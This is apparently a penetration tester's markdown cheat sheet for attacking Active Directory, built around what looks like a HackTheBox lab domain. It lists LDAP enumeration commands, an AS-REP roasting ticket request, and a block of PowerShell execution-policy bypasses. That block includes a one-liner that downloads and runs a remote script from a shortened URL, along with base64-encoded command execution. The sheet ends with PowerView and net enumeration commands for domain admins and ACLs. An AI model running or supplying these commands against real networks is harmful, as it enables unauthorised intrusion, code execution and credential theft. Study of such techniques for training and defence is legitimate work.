
# External 
```
 nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
```
```
ldapsearch -x -H ldap://10.129.95.210 \
  -b "dc=htb,dc=local" \
  "(objectClass=*)"
```
>[!NOTE]
> Determine if service account or whatever account that is found needs authentication disabled
> Request tgt using this command:
```
GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.129.95.210
```

# Internal 
>[!NOTE]
> Import ActiveDirectory
>
>Get-Module -ListAvailable -Name ActiveDirectory
>
> Install-WindowsFeature -Name RSAT-AD-PowerShell

**Use to bypass any restrictions**
```

Get-Content .runme.ps1 | PowerShell.exe -noprofile -

Get-Content .runme.ps1 | Invoke-Expression

PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1

Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted

Set-ExecutionPolicy Bypass -Scope Process

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"

Powershell -command "Write-Host 'My voice is my passport, verify me.'"

$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedComman
```
### Powerview
```
Import-Module ./PowerView.ps1
```

**Basic Domain Information**
```
Get-ADDomain
Get-ADForest
Get-NetDomain
Get-NetForest
```
**Computer Enumeration**
```
Get-NetComputer
Get-NetComputer -OperatingSystem "*Windows Server 2019*"
Get-NetComputer -UnconstrainedDelegation $true
```
**ACL Information**
```
Get-ObjectAcl -ResolveGUIDs
Get-NetGPO
Get-NetOU
Find-InterestingDomainAcl
```
**Users** 
```
net accounts /domain
net group /domain
net group "Domain Admins" /domain
net view \computer /ALL 
